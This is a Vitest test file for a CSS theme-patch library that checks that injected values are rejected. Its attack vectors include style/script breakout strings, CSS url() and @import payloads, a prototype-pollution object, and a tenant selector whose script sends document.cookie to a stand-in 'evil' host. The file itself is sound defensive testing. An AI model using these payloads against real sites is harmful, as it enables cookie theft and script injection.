import { describe, expect, test } from 'vitest'
import { defineTheme } from './define'
import { ThemeonError } from './errors'
import { resolveTheme } from './resolve'
import { applyThemePatch, serializeThemePatch } from './patch'
import type { ResolvedTheme } from './types'
import type { TokenTreeInput } from './types'

/**
 * `applyThemePatch`/`serializeThemePatch` (P6.1, H3 И1). Тест-вектора атак пишутся ПЕРВЫМИ —
 * см. `patch-grammar.test.ts` для юнит-уровня грамматики; этот файл проверяет интеграцию
 * (path-резолюция из `base.tokens`, детерминизм вывода, композит text, коды ошибок сквозь путь).
 */

/** База со всеми 7 tenant-типами + запрещённым `shadow` — покрывает Scope Included P6.1. */
function fullBase(): ResolvedTheme {
  const theme = defineTheme({
    base: {
      color: { bg: { page: '#ffffff' }, action: { primary: '#3355ff' } },
      space: { 4: '1rem' },
      fontWeight: { bold: 700 },
      font: { sans: 'system-ui, sans-serif' },
      duration: { fast: '150ms' },
      z: { modal: 40 },
      text: { '2xl': { size: '1.5rem', lineHeight: 1.33 } },
      shadow: { card: '0 1px 2px black' },
    },
  })
  return resolveTheme(theme)
}

function code(fn: () => unknown): string {
  try {
    fn()
  } catch (e) {
    return (e as ThemeonError).code
  }
  throw new Error('expected a throw')
}

describe('applyThemePatch — вектора атак сквозь путь (path → type → грамматика)', () => {
  const base = fullBase()

  test.each([
    ['color.bg.page', 'red}</style><script>alert(1)</script>'],
    ['color.bg.page', '#fff;}'],
    ['space.4', '1px}'],
    ['color.bg.page', 'url(https://evil.example/exfil)'],
    ['color.bg.page', 'expression(alert(1))'],
    ['color.bg.page', '@import url(x)'],
    ['color.bg.page', '#fff/*'],
    ['color.bg.page', 'a\\3c b'],
    ['space.4', '10px\n}'],
    ['font.sans', 'system-ui" onload="alert(1)'],
  ] as const)('%s = %s → throw ThemeonError, не проходит в CSS', (dottedPath, value) => {
    const [group, ...rest] = dottedPath.split('.')
    const patch: TokenTreeInput = { [group!]: buildNested(rest, value) }
    expect(() => applyThemePatch(base, patch)).toThrow(ThemeonError)
  })
})

/** Собирает вложенный объект-патч из хвоста пути и листа: ['bg','page'] → {bg:{page:leaf}}. */
function buildNested(path: string[], leaf: unknown): TokenTreeInput {
  if (path.length === 0) return leaf as TokenTreeInput
  return { [path[0]!]: buildNested(path.slice(1), leaf) } as TokenTreeInput
}

describe('applyThemePatch — легальные значения проходят и нормализуются', () => {
  const base = fullBase()

  test('color нормализуется (hex → нижний регистр)', () => {
    const { vars } = applyThemePatch(base, { color: { bg: { page: '#1A73E8' } } })
    expect(vars['--color-bg-page']).toBe('#1a73e8')
  })

  test('dimension/fontWeight/duration/fontFamily проходят как есть', () => {
    const { vars } = applyThemePatch(base, {
      space: { 4: '1.5rem' },
      fontWeight: { bold: 600 },
      duration: { fast: '200ms' },
      font: { sans: 'Inter, system-ui, sans-serif' },
    })
    expect(vars['--spacing-4']).toBe('1.5rem')
    expect(vars['--font-weight-bold']).toBe('600')
    expect(vars['--duration-fast']).toBe('200ms')
    expect(vars['--font-sans']).toBe('Inter, system-ui, sans-serif')
  })
})

describe('applyThemePatch — коды ошибок', () => {
  const base = fullBase()

  test('несуществующий путь → UNKNOWN_PATH', () => {
    expect(code(() => applyThemePatch(base, { color: { bg: { footer: '#000000' } } }))).toBe('UNKNOWN_PATH')
  })

  test('__proto__ в пути патча → UNSAFE_PATH, не TypeError/prototype pollution', () => {
    const dangerous = JSON.parse('{"__proto__":{"x":"#000000"}}') as unknown as TokenTreeInput
    expect(code(() => applyThemePatch(base, dangerous))).toBe('UNSAFE_PATH')
    // prototype pollution реально не произошло:
    expect(({} as Record<string, unknown>).x).toBeUndefined()
  })

  test('shadow (запрещён v1, P-D70) → UNSUPPORTED_TENANT_TYPE, не silent-skip', () => {
    expect(code(() => applyThemePatch(base, { shadow: { card: '0 0 0 red' } }))).toBe('UNSUPPORTED_TENANT_TYPE')
  })
})

describe('applyThemePatch — text-композит: две переменные из одного пути', () => {
  const base = fullBase()

  test('size + lineHeight эмитятся в свои переменные (double-dash companion, naming.ts)', () => {
    const { vars } = applyThemePatch(base, { text: { '2xl': { size: '1.75rem', lineHeight: 1.4 } } })
    expect(vars['--text-2xl']).toBe('1.75rem')
    expect(vars['--text-2xl--line-height']).toBe('1.4')
  })

  test('только size, без lineHeight — companion-переменная не трогается', () => {
    const { vars } = applyThemePatch(base, { text: { '2xl': { size: '1.8rem' } } })
    expect(vars['--text-2xl']).toBe('1.8rem')
    expect('--text-2xl--line-height' in vars).toBe(false)
  })
})

describe('applyThemePatch — детерминизм и порядок вывода', () => {
  const base = fullBase()

  test('двойной вызов даёт байт-в-байт равный CSS', () => {
    const patch: TokenTreeInput = { duration: { fast: '90ms' }, color: { bg: { page: '#010203' } } }
    const a = applyThemePatch(base, patch)
    const b = applyThemePatch(base, patch)
    expect(a.css).toBe(b.css)
  })

  test('порядок вывода = порядок base.tokens, а не порядок ключей патча', () => {
    // Патч трогает duration (группа объявлена в base ПОСЛЕ color) раньше, чем color, по
    // JSON-ключам — вывод обязан всё равно идти в порядке base.tokens: color раньше duration.
    const patch: TokenTreeInput = { duration: { fast: '90ms' }, color: { bg: { page: '#010203' } } }
    const { css } = applyThemePatch(base, patch)
    const colorIdx = css.indexOf('--color-bg-page')
    const durationIdx = css.indexOf('--duration-fast')
    expect(colorIdx).toBeGreaterThanOrEqual(0)
    expect(durationIdx).toBeGreaterThan(colorIdx)
  })
})

test('applyThemePatch — snapshot CSS-вывода', () => {
  const base = fullBase()
  const { css } = applyThemePatch(base, {
    color: { bg: { page: '#101014' } },
    space: { 4: '1.25rem' },
  })
  expect(css).toMatchInlineSnapshot(`
    ":root {
      --color-bg-page: #101014;
      --spacing-4: 1.25rem;
    }
    "
  `)
})

test('serializeThemePatch — .css-обёртка над applyThemePatch, никогда не <style>-тег', () => {
  const base = fullBase()
  const css = serializeThemePatch(base, { color: { bg: { page: '#101014' } } })
  expect(css).toBe(applyThemePatch(base, { color: { bg: { page: '#101014' } } }).css)
  expect(css).not.toMatch(/<style/i)
  expect(css.startsWith(':root {')).toBe(true)
})

test('applyThemePatch — layer default false (не оборачивает); строка — оборачивает @layer', () => {
  const base = fullBase()
  const flat = applyThemePatch(base, { color: { bg: { page: '#101014' } } })
  expect(flat.css.startsWith('@layer')).toBe(false)

  const layered = applyThemePatch(base, { color: { bg: { page: '#101014' } } }, { layer: 'tenant' })
  expect(layered.css.startsWith('@layer tenant {')).toBe(true)
  expect(layered.css).toContain('--color-bg-page: #101014;')
})

test('serializeThemePatch — опциональный selector проходит через assertSafeCssToken (reuse)', () => {
  const base = fullBase()
  expect(() => serializeThemePatch(base, { color: { bg: { page: '#101014' } } }, { selector: '[data-tenant="acme"]' })).not.toThrow()
  expect(code(() => serializeThemePatch(base, { color: { bg: { page: '#101014' } } }, { selector: '{evil}' }))).toBe(
    'UNSAFE_CSS_TOKEN',
  )
})

test('serializeThemePatch — tenant-derived selector <>-breakout (adversarial-verify P6.1, H3) throws UNSAFE_CSS_TOKEN', () => {
  const base = fullBase()
  const tenantId = 'x"]</style><script>fetch(\'//evil?\'+document.cookie)</script><style>[y="'
  expect(
    code(() =>
      serializeThemePatch(base, { color: { bg: { page: '#101014' } } }, { selector: `[data-tenant="${tenantId}"]` }),
    ),
  ).toBe('UNSAFE_CSS_TOKEN')
})
